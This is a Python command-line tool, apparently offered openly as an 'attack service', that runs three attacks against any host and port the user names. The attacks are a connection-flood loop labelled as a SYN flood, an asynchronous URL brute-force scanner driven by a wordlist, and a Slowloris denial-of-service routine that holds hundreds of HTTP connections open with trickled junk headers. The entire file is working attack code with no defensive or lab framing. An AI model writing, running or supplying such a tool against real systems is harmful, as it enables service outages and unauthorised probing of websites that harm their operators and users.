import argparse
import asyncio
import socket
import threading
import time
import random
import aiohttp


class AttackService:
    def __init__(self, target, port, rate=500):
        self.target = target
        self.port = int(port)
        self.rate = rate
        self.running = False
        self.start_time = None
        self.request_count = 0

    # SYN Flood Attack
    def syn_flood(self):
        print(f"Starting SYN flood attack on {self.target}:{self.port}")
        self.running = True
        self.start_time = time.time()

        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect_ex((self.target, self.port))

                with threading.Lock():
                    self.request_count += 1

                elapsed = time.time() - self.start_time
                expected_time = self.request_count / self.rate
                if elapsed < expected_time:
                    time.sleep(expected_time - elapsed)

                if self.request_count % 100 == 0:
                    rate = self.request_count / elapsed if elapsed > 0 else 0
                    print(
                        f"SYN packets sent: {self.request_count} | Rate: {rate:.2f}/s"
                    )

            except Exception:
                continue

    # URL Brute Force Attack
    async def url_bruteforce(self, wordlist_path):
        print(f"Starting URL brute-force on {self.target}:{self.port}")
        self.running = True
        self.start_time = time.time()

        # Load wordlist
        try:
            with open(wordlist_path, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Wordlist {wordlist_path} not found!")
            return

        base_url = f"http://{self.target}:{self.port}/"
        connector = aiohttp.TCPConnector(limit=100)
        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout
        ) as session:
            tasks = []
            for url in urls:
                full_url = f"{base_url}{url}"
                tasks.append(self._check_url(session, full_url))

            await asyncio.gather(*tasks)

    async def _check_url(self, session, url):
        try:
            async with session.get(url) as response:
                self.request_count += 1
                elapsed = time.time() - self.start_time
                expected_time = self.request_count / self.rate
                if elapsed < expected_time:
                    await asyncio.sleep(expected_time - elapsed)

                if response.status != 404:
                    print(f"Found: [{response.status}] {url}")

                if self.request_count % 100 == 0:
                    rate = self.request_count / elapsed if elapsed > 0 else 0
                    print(f"URLs checked: {self.request_count} | Rate: {rate:.2f}/s")

        except Exception as e:
            print(f"Error checking {url}: {e}")

    # Slowloris Attack
    async def slowloris(self, connections=200):
        print(f"Starting Slowloris attack on {self.target}:{self.port}")
        self.running = True
        self.start_time = time.time()
        sockets = []

        # Create initial connections
        for _ in range(connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                sockets.append(s)
                self.request_count += 1

                elapsed = time.time() - self.start_time
                expected_time = self.request_count / self.rate
                if elapsed < expected_time:
                    await asyncio.sleep(expected_time - elapsed)

            except Exception as e:
                print(f"Connection error: {e}")

        print(f"Established {len(sockets)} connections")

        # Keep connections alive
        while self.running:
            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1, 1000)}\r\n".encode())
                    self.request_count += 1

                    elapsed = time.time() - self.start_time
                    expected_time = self.request_count / self.rate
                    if elapsed < expected_time:
                        await asyncio.sleep(expected_time - elapsed)

                except Exception:
                    sockets.remove(s)
                    try:
                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_s.connect((self.target, self.port))
                        new_s.send(
                            f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode()
                        )
                        sockets.append(new_s)
                    except:
                        continue

            await asyncio.sleep(5)

    def stop(self):
        self.running = False
        print("\nStopping attack...")


def main():
    parser = argparse.ArgumentParser(description="Simple Attack Service")
    parser.add_argument("--target", required=True, help="Target IP or hostname")
    parser.add_argument("--port", required=True, help="Target port")
    parser.add_argument(
        "--attack",
        required=True,
        choices=["synflood", "bruteforce", "slowloris"],
        help="Type of attack to perform",
    )
    parser.add_argument("--wordlist", help="Wordlist file for bruteforce attack")

    args = parser.parse_args()

    attacker = AttackService(args.target, args.port)

    try:
        if args.attack == "synflood":
            thread = threading.Thread(target=attacker.syn_flood)
            thread.start()
            thread.join()

        elif args.attack == "bruteforce":
            if not args.wordlist:
                print("Wordlist required for bruteforce attack")
                return
            asyncio.run(attacker.url_bruteforce(args.wordlist))

        elif args.attack == "slowloris":
            asyncio.run(attacker.slowloris())

    except KeyboardInterrupt:
        attacker.stop()


if __name__ == "__main__":
    main()
